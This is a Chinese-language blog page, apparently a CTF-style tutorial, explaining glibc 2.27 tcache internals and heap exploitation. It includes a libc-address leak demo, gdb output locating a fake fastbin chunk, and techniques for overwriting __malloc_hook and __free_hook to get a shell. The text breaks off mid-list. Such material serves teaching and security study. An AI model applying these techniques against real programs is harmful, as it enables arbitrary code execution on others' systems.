@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="在2.27版本中尝试进行堆的简单攻击tcache bin 基础 tcache机制是glibc 2.26之后引入的一种技术，它提高了堆管理器的性能，但是舍弃了很多的安全检查，所以有多种利用方式，现在的题目一般都基于更新版本的libc，tcache肯定是必不可少的一环，而且是最开始的那一环。  1.每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk，64位机器16字节递增，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://www.imalun.com/2025/10/25/%E5%9C%A82.27%E7%89%88%E6%9C%AC%E4%B8%AD%E5%B0%9D%E8%AF%95%E8%BF%9B%E8%A1%8C%E5%A0%86%E7%9A%84%E7%AE%80%E5%8D%95%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="在2.27版本中尝试进行堆的简单攻击tcache bin 基础 tcache机制是glibc 2.26之后引入的一种技术，它提高了堆管理器的性能，但是舍弃了很多的安全检查，所以有多种利用方式，现在的题目一般都基于更新版本的libc，tcache肯定是必不可少的一环，而且是最开始的那一环。  1.每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk，64位机器16字节递增，">
+<meta property="og:locale">
+<meta property="og:image" content="https://www.imalun.com/img/404.jpg">
+<meta property="og:image" content="https://www.imalun.com/img/404.jpg">
+<meta property="og:image" content="https://www.imalun.com/img/404.jpg">
+<meta property="og:image" content="https://www.imalun.com/img/404.jpg">
+<meta property="og:image" content="https://www.imalun.com/img/404.jpg">
+<meta property="og:image" content="https://www.imalun.com/img/404.jpg">
+<meta property="article:published_time" content="2025-10-25T12:51:45.052Z">
+<meta property="article:modified_time" content="2025-10-25T12:50:29.542Z">
+<meta property="article:author" content="enp0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.imalun.com/img/404.jpg">
+
+
+<title >Hexo</title>
+
+<!-- Favicon -->
+
+    <link href='/favicon-16x16.png?v=2.2.6' rel='icon' type='image/png' sizes='16x16' ></link>
+
+
+    <link href='/favicon-32x32.png?v=2.2.6' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+    <link href='/apple-touch-icon.png?v=2.2.6' rel='apple-touch-icon' sizes='180x180' ></link>
+
+
+    <link href='/site.webmanifest' rel='manifest' ></link>
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://npm.elemecdn.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+    
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"www.imalun.com","author":"enp0","root":"/","typed_text":["沉浸在二进制海洋里的二进制狗"],"theme_version":"2.2.6","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"log.png","icon16":"favicon-16x16.png","icon32":"favicon-32x32.png","apple_touch_icon":"apple-touch-icon.png","webmanifest":"/site.webmanifest","visibilitychange":true,"hidden":"failure.ico","show_text":"欢迎各位✌莅临指导","hide_text":"(●—●)喔哟，崩溃啦！"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":false,"plugin":{"flickr_justified_gallery":"https://npm.elemecdn.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy","user_tag":"fas fa-user-alt"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":false,"title":"default","height_limit":200},"toc":{"post_title":false},"live_time":{"start_time":"07/10/2025 17:00:00","prefix":"博客已萌萌哒运行 undefined 天"},"danmu":{"enable":false,"el":".trm-banner"},"covers":["/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E4%B8%AD%E4%B8%96%E7%BA%AA-%E5%AD%A4%E7%8B%AC%E7%9A%84%E5%A5%B3%E5%AD%A9.png","/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%A2%A8%E4%BE%A0%E5%AE%A2%E8%A1%8C-%E6%8F%92%E7%94%BB.png","/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%8D%A1%E6%AF%94-%E6%95%B0%E5%AD%97%E8%89%BA%E6%9C%AF-%E6%B0%B4.png","/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E4%B8%A4%E7%A7%8D%E8%89%B2%E8%B0%83%E7%9A%84%E5%A4%B4%E5%8F%91-%E5%8A%A8%E6%BC%AB%E5%A5%B3%E5%AD%A9.pmg","/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91Chris%E6%8F%92%E7%94%BB-%E6%8F%92%E7%94%BB.png","/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91WLOP-%E7%89%B9%E5%86%99.png","/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%B8%BD%E5%AD%90-%E6%89%8B%E5%A5%97-%E7%94%B5%E5%BD%B1%E4%BA%BA%E7%89%A9.png"]};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2025-10-25 20:50:29"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.6" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+
+
+     
+
+    
+
+    
+ 
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
+            <!-- top bar -->
+            <header class="trm-top-bar">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+        <img alt="logo" src="/log.png">
+    
+    
+        <div class="trm-logo-text">
+            enp0的个人博客<span></span>
+        </div>
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    首页
+                </a>
+                
+                <ul>
+                    
+                    <li>
+                        <a  href="/archives2/" target="">
+                            archives2
+                        </a>
+                    </li>
+                    
+                </ul>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/archives/" target="">
+                    归档
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/categories/" target="">
+                    分类
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/links/" target="">
+                    友链
+                </a>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner">
+    
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="/backgroung.png">
+    <!-- banner cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            NEWS LETTER
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        2025
+                                    </span>
+                                </li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <span id="scroll-triger" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </span>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div class="trm-page-sidebar col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    <div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card"> 
+        <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20">
+        <img alt="Avatar" class="trm-avatar" src="/touxiang.png">
+    </div>
+    <h5 class="trm-name trm-mb-15">
+        enp0
+    </h5>
+    
+        <div class="trm-label">
+            一个
+            <span class="trm-typed-text">
+                <!-- Words for theme.user.typedText -->
+            </span>
+        </div>
+    
+</div>
+<!-- card header end -->
+        <!-- sidebar social -->
+
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<div class="trm-social">
+    
+        <a href="https://github.com" title="github" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-github"></i>
+        </a>
+    
+        <a href="https://accessible.com" title="gitee" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-accessible-icon"></i>
+        </a>
+    
+        <a href="https://earlybirds.com" title="gitee" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-earlybirds"></i>
+        </a>
+    
+        <a href="https://github.com" title="gitee" rel="nofollow" target="_blank">
+            <i class="iconfont far fa-grin-tongue-squint"></i>
+        </a>
+    
+</div>
+
+<!-- sidebar social end -->
+        <!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                地址:
+            </div>
+            <div class="trm-label trm-label-light">
+                火星
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                年龄:
+            </div>
+            <div class="trm-label trm-label-light">
+                18
+            </div>
+        </li>
+    
+</ul>
+<!-- info end -->
+
+        
+    <div class="trm-divider trm-mb-40 trm-mt-40"></div>
+    <!-- action button -->
+    <div class="text-center">
+        <a href="mailto:2209645844@qq.com" class="trm-btn">
+            联系我
+            <i class="iconfont far fa-envelope"></i>
+        </a>
+    </div>
+    <!-- action button end -->
+
+    </div>
+</div>
+                    <!-- main card end -->
+                </div>
+            
+            <div class="trm-page-content col-lg-8">
+                <div id="trm-content" class="trm-content">
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            10/25
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            20:50
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            enp0
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h1 id="在2-27版本中尝试进行堆的简单攻击"><a href="#在2-27版本中尝试进行堆的简单攻击" class="headerlink" title="在2.27版本中尝试进行堆的简单攻击"></a>在2.27版本中尝试进行堆的简单攻击</h1><h2 id="tcache-bin-基础"><a href="#tcache-bin-基础" class="headerlink" title="tcache bin 基础"></a>tcache bin 基础</h2><ul>
+<li><p>tcache机制是glibc 2.26之后引入的一种技术，它提高了堆管理器的性能，但是舍弃了很多的安全检查，所以有多种利用方式，现在的题目一般都基于更新版本的libc，tcache肯定是必不可少的一环，而且是最开始的那一环。</p>
+</li>
+<li><p>1.每个线程默认使用64个单链表结构的bins，每个bins<strong>最多存放7个chunk</strong>，64位机器16字节递增，从0x20到0x410，也就是说位于以上大小的chunk释放后都会先行存入到tcache bin中。</p>
+</li>
+<li><p>2.对于每个tcache bin单链表，它和fast bin一样都是先进后出，而且prev_inuse标记位都不会被清除，所以tcache bin中的chunk<strong>不会被合并</strong>，即使和Top chunk相邻。</p>
+</li>
+<li><p>tcache机制出现后，每次产生堆都会先产生一个0x250大小的堆块，该堆块位于堆的开头，用于记录64个bins的地址（这些地址指向用户数据部分）以及每个bins中chunk数量。在这个0x250大小的堆块中，前0x40个字节用于记录每个bins中chunk数量，每个字节对应一条tcache bin链的数量，从0x20开始到0x410结束，刚好64条链，然后剩下的每8字节记录一条tcache bin链的开头地址，也是从0x20开始到0x410结束。还有一点值得注意的是，tcache bin中的fd指针是指向malloc返回的地址，也就是用户数据部分，而不是像fast bin单链表那样fd指针指向chunk头。</p>
+</li>
+</ul>
+<p>tcache_entry</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
+
+<p>tcache_entry用于链接空闲的chunk结构体，其中next指针指向下一个大小相同的chunk。（fd指向fd）</p>
+<p><img src="/../images/blog/image-20251023174725729.png" alt="image-20251023174725729"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p>tcache_perthread_struct</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"># define TCACHE_MAX_BINS               </span><br><span class="line"></span><br><span class="line">static __thread tcache_perthread_struct *tcache = NULL;</span><br></pre></td></tr></table></figure>
+
+<p>tcache_perthread_struct：管理tcache链表的，位于heap段的起始位置，size大小为0x251<br>tcache_entry ：用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk<br>counts ：记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk</p>
+<p>tcache_perthread_struct、tcache_entry和malloc_chunk三者的关系如下</p>
+<p><img src="/../images/blog/image-20251023174741172.png" alt="image-20251023174741172"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><ul>
+<li><p>第一次malloc时，回显malloc一块内存用来存放tcache_perthread_struct，这块内存size一般为0x251。</p>
+</li>
+<li><p>释放chunk时，如果chunk的size小于small bin size，在进入tcache之前会先放进fastbin或者unsorted bin中。</p>
+</li>
+<li><p>在放入tcache后：</p>
+</li>
+<li><p>先放到对应的tcache中，直到tcache被填满（7个）</p>
+</li>
+<li><p>tcache被填满后，接下来再释放chunk，就会直接放进fastbin或者unsorted bin中</p>
+</li>
+<li><p>tcache中的chunk不会发生合并，不取消inuse bit</p>
+</li>
+<li><p>重新申请chunk，并且申请的size符合tcache的范围，则先从tcache中取chunk，直到tcache为空</p>
+</li>
+<li><p>tcache为空时，如果fastbin、small bin、unsorted bin中有size符合的chunk，会先把fastbin、small bin、unsorted bin中的chunk放到tcache中，直到填满，之后再从tcache中取</p>
+</li>
+<li><p>需要注意的是，在采用tcache的情况下，只要是bin中存在符合size大小的chunk，那么在重启之前都需要经过tcache一手。并且由于tcache为空时先从其他bin中导入到tcache，所以此时chunk在bin中和在tcache中的顺序会反过来<br>## 绕过tcache</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  long long *ptr[7];</span><br><span class="line">  long long *a = malloc(0x80);</span><br><span class="line">  for (int i=0; i&lt;7; i++)</span><br><span class="line">      ptr[i] = malloc(0x80);</span><br><span class="line">  for (int i=0; i&lt;7; i++)</span><br><span class="line">      free(ptr[i]);</span><br><span class="line">  free(a);</span><br><span class="line">  printf(&quot;libc addr is %llx\n&quot;, (long long)a[0]);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/blog/image-20251023174759356.png" alt="image-20251023174759356"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><br>然后再free(a);<br><img src="/../images/blog/image-20251023174812256.png" alt="image-20251023174812256"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><br>tcache机制无非就是增加了一层缓存，如果我们还是想使用fast bin&#x2F;unsorted bin等的性质，那么需要将<strong>对应的tcache bin填满</strong>，然后再执行相应的操作就可以了。</p>
+</li>
+</ul>
+<h3 id="malloc-hook以及-free-hoook的作用"><a href="#malloc-hook以及-free-hoook的作用" class="headerlink" title="__malloc_hook以及__free_hoook的作用"></a>__malloc_hook以及__free_hoook的作用</h3><p>在调用malloc或者free的时候，如果 malloc_hook 和free_hook的值存在，则会调用malloc_hook或者free_hook指向的地址，假设在使用one_gadget的时候满足one_gadget的调用条件，当overwrite malloc_hook和free_hook的时候，便可以getshell，执行malloc的时候，其参数是size大小，所以overwrite malloc_hook的时候使用one_gadget的地址可以getshell。执行free的时候，可以将__free_hook的值overwrite为system的地址，通过释放(&#x2F;bin&#x2F;sh\x00)的chunk，可以达到system(&#x2F;bin&#x2F;sh)来getshell</p>
+<h3 id="劫持原理"><a href="#劫持原理" class="headerlink" title="劫持原理"></a>劫持原理</h3><p>malloc_hook位于main_arena上方-0x10的位置，可以通过fake chunk来overwrite该值实现getshell</p>
+<p>free_hook 位于libc上_free_hook上，可以通过fake chunk来overwrite该值达到劫持程序流的目的</p>
+<h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h3><ul>
+<li>malloc_hook的调用</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  2907   void *(*hook) (size_t, const void *)</span><br><span class="line">► 2908     = atomic_forced_read (__malloc_hook);</span><br><span class="line">  2909   if (__builtin_expect (hook != NULL, 0))</span><br><span class="line">  2910     return (*hook)(bytes, RETURN_ADDRESS (0));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>对应的汇编代码为</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000730AE                 push    rbp             ; Alternative name is &#x27;__libc_malloc&#x27;</span><br><span class="line">.text:00000000000730AF                 push    rbx</span><br><span class="line">.text:00000000000730B0                 sub     rsp, 8</span><br><span class="line">.text:00000000000730B4                 mov     rbp, rdi</span><br><span class="line">.text:00000000000730B7                 mov     rax, cs:__malloc_hook_ptr #取malloc_hook的位置</span><br><span class="line">.text:00000000000730BE                 mov     rax, [rax] #取malloc_hook的值</span><br><span class="line">.text:00000000000730C1                 test    rax, rax</span><br><span class="line">.text:00000000000730C4                 jz      short loc_730D2</span><br><span class="line">.text:00000000000730C6                 mov     rsi, [rsp+18h]</span><br><span class="line">.text:00000000000730CB                 call    rax</span><br><span class="line">malloc_hook的存储地址</span><br><span class="line">.got:0000000000388EF8 __malloc_hook_ptr dq offset __malloc_hook</span><br><span class="line">malloc_hook的存储位置</span><br><span class="line">.data:0000000000389B10 __malloc_hook   dq offset malloc_hook_ini</span><br><span class="line">.data:0000000000389B10                                         ; DATA XREF: LOAD:000000000000A380↑o</span><br><span class="line">.data:0000000000389B10                                         ; .got:__malloc_hook_ptr↑o</span><br><span class="line">.data:0000000000389B18                 align 20h</span><br><span class="line">.data:0000000000389B20 ; malloc_state main_arena</span><br><span class="line">.data:0000000000389B20 main_arena      malloc_state &lt;0, 0, 0, 0, 0, 0, 0, offset main_arena, 0, 1, 0, 0&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用思路：在执行malloc时，会检测__malloc_hook的值，如果malloc_hook的值存在，将调用malloc_hook指向的地址call rax，如果我们将该值overite 为one_gadget，当程序执行malloc的时候，便可以getshell</li>
+<li>实际利用过程<ul>
+<li>malloc_hook的存储的位置</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;__malloc_hook</span><br><span class="line">$2 = (void *(**)(size_t, const void *)) 0x7ffff7dd5b10 &lt;__malloc_hook&gt;</span><br><span class="line">gdb-peda$ p &amp;main_arena</span><br><span class="line">$3 = (struct malloc_state *) 0x7ffff7dd5b20 &lt;main_arena&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在malloc_hook 上方查找满足条件的fastbin 的size</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/8gx  0x7ffff7dd5b00-0x20</span><br><span class="line">0x7ffff7dd5ae0 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd5af0 &lt;_IO_wide_data_0+304&gt;:	0x00007ffff7dd4260	0x0000000000000000</span><br><span class="line">0x7ffff7dd5b00 &lt;__memalign_hook&gt;:	0x00007ffff7ac0305	0x00007ffff7ac02c6</span><br><span class="line">0x7ffff7dd5b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查找符合条件的fake_fastbin,pwndbg内置了查找符合条件的fake_fast_bin的命令</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find_fake_fast 0x7ffff7dd5b10 0x7f</span><br><span class="line">FAKE CHUNKS</span><br><span class="line">Fake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: 0x7ffff7dd5aed</span><br><span class="line">prev_size: 0xfff7ac02c600007f</span><br><span class="line">size: 0x7f</span><br><span class="line">fd: 0x00</span><br><span class="line">bk: 0x7f</span><br><span class="line">fd_nextsize: 0xfff7ac0305000000</span><br><span class="line">bk_nextsize: 0xfff7dd4260000000</span><br></pre></td></tr></table></figure>
+
+<p>伪造的fastbin的addr为0x7ffff7dd5aed，当程序可以在该位置申请chunk的时候，便可以达到程序流劫持getshell</p>
+<h3 id="free-hook"><a href="#free-hook" class="headerlink" title="free_hook"></a>free_hook</h3><ul>
+<li>free_hook的调用</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  2939   void (*hook) (void *, const void *)</span><br><span class="line">► 2940     = atomic_forced_read (__free_hook);</span><br><span class="line">  2941   if (__builtin_expect (hook != NULL, 0))</span><br><span class="line">  2942     &#123;</span><br><span class="line">  2943       (*hook)(mem, RETURN_ADDRESS (0));</span><br><span class="line">  2944       return;</span><br><span class="line">  2945     &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>对应的汇编代码为</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">汇编代码</span><br><span class="line">.text:00000000000736F4                 sub     rsp, 8          ; Alternative name is &#x27;cfree&#x27;</span><br><span class="line">.text:00000000000736F8                 mov     rax, cs:__free_hook_ptr</span><br><span class="line">.text:00000000000736FF                 mov     rax, [rax]</span><br><span class="line">.text:0000000000073702                 test    rax, rax</span><br><span class="line">.text:0000000000073705                 jz      short loc_73710</span><br><span class="line">.text:0000000000073707                 mov     rsi, [rsp+8]</span><br><span class="line">.text:000000000007370C                 call    rax</span><br><span class="line">free_hook 的存储地址</span><br><span class="line">.got:0000000000388F00 __free_hook_ptr dq offset __free_hook   ; DATA XREF: ptmalloc_lock_all+EA↑r</span><br><span class="line">free_hook 的存储位置</span><br><span class="line">.bss:000000000038B7A8 __free_hook     dq ?                    ; DATA XREF: LOAD:0000000000005190↑o</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>利用思路：</p>
+<ul>
+<li>通过改写main_arena中的top_chunk的地址，将top_chunk的值改写到<strong>free_hook上方指定的位置，通过不断向top_chunk申请chunk，最终可以分配到包含</strong>free_hook的区块，从而可以改写__free_hook的值。</li>
+<li>通过改写global_max_fast的值，可以在free_hook的上方找到一个足够大包含free_hook的块，当改写了global_max_fast后，向heap申请的块都将按照fastbin来处理</li>
+<li>通过unsorted bin attack 在free_hook上方<strong>伪造 0x7f大小的chunk</strong>,再通过fastbin attack 来修改free_hoook的值</li>
+</ul>
+</li>
+<li><p>实际利用过程</p>
+<ul>
+<li><p>修改top_chunk</p>
+<ul>
